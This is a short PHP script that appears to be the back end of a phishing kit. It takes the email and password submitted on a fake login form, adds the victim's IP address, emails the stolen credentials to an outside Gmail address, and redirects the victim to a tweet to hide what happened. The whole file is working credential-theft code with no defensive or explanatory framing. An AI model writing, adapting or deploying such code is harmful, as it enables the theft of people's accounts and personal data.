<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT Flow   By JoCk |--------------|\n";
$message .= "|Email        		  : ".$_POST['email']."\n";
$message .= "|Password          : ".$_POST['pass']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "judileblanc1234@gmail.com";
$subject = "RESULT Flow  By JoCk- From:  [ $ip ]";

{
mail("$send", "$subject", $message);
}
header("Location: https://twitter.com/TheRealAldenMcL/status/1249825647385612293");
?>


